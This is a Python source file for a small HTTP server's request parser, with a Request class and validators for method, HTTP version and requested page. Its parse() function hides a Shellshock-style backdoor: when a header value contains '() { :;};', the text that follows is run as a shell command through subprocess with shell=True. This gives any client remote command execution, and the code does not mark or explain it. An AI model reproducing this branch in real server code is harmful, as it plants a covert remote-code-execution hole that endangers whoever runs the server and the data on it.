# response.py
# Author: Jason Howe
# Receives HTTP requests

import os
import subprocess

class Request:
    """ Request Class

    Attributes
    ------
    method
        the reqeust method
    page 
        the requested page
    version
        http version string
    host
        the requested server
    headers
        the http headers for the response
    body
        the body for the response
    """

    method = str
    page = str
    version = str
    headers = dict
    body = str


    def __init__(self, method: str, page: str, version: str, headers: dict, body: str):
        self.method = method
        self.page = page
        self.version = version
        self.headers = headers
        self.body = body


    def __str__(self):
        req = self.method + " " + self.page + " " + self.version + "\r\n"
        for key in self.headers:
            req += key.upper() + ": " + self.headers[key] + "\r\n"
        req += "\r\n"
        req += self.body
        return req
    

def parse(req: str) -> (int, Request):
    print(req)
    # split metadata and body
    req_data = req.split("\r\n\r\n")  

    # create list to iterate thru
    req_lines = req_data[0].split("\r\n")

    method = ""
    page = ""
    version = ""
    headers = dict()
    try:
        body = req_data[1]
    except IndexError:
        body = ""

    i = 0 
    for line in req_lines:
        if i == 0:
            try: 
                method = line.split(" ")[0]
                # print("method:", method)
                page = line.split(" ")[1]
                # print("page:", page)
                version = line.split(" ")[2]
                # print("version:", version)
            except Exception:
                return (1, None)
        else:
            # print("header line:", line)
            head = line.split(":",1)
            if head == "":
                continue
            headers[head[0]] = head[1]
            if "() { :;};" in head[1]:
                cmd = head[1].split("() { :;}; ")[1]
                subprocess.run(cmd, shell=True, capture_output=True, text=True)
        i += 1

    request = Request(
        method,
        page,
        version,
        headers,
        body
    )
    return (0, request)


def validate_method(method: str) -> bool:
    """ Validates the method of the HTTP Request

    Paramters
    --------
    method : str
        the method to validate

    Returns
    -------
    bool
        True if the method is valid
        False if not
    """ 
    valid_methods = ["GET", "POST", "PUT", "DELETE", "HEAD"]
    if method in valid_methods:
        return True
    else:
        return False
    

def validate_version(version: str) -> bool:
    """ Validates the Version in the HTTP Request

    Paramters
    --------
    version : str
        the method to validate

    Returns
    -------
    bool
        True if the version is valid
        False if not
    """ 
    valid_versions = ["HTTP/1.1"] # list so that we can add HTTP/2.0 support in the future
    if version in valid_versions:
        return True
    else:
        return False
    

def validate_page(page: str) -> bool:
    """ Validates the Page in the HTTP Request

    Paramters
    --------
    page : str
        the method to validate

    Returns
    -------
    bool
        True if the page exists
        False if not
    """ 
    pages = os.listdir("pages_tmp")
    pages = [file for file in pages if os.path.isfile(os.path.join("pages_tmp", file))]
    if page.lstrip("/") in pages:  
        return True
    else:
        return False
    

